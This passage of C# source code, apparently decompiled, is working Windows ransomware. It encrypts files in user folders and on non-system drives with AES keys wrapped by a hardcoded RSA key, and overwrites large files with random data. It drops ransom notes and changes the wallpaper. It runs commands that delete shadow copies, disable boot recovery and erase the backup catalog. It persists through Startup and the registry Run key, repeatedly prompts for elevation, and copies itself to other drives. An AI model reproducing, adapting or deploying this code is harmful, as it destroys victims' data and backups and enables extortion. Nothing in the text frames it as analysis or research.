		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly()!.Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			string extension;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152L)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000L)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>x2C8KqBtYKY/cf4WscRvxNkivGaiEdERRV3XPX6L1U+GJiTGNTsfWnBXT8EfbHPScYKZATNnyaI3qRw8AN+HJpYDz+Gu/nsGOAEC3/wj1tqdIaFmDv5LORPaDl54vffSkl55wJrC0c5yj9+vkio1+KCenFU/fxFwEY3ul4uGHH0=</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
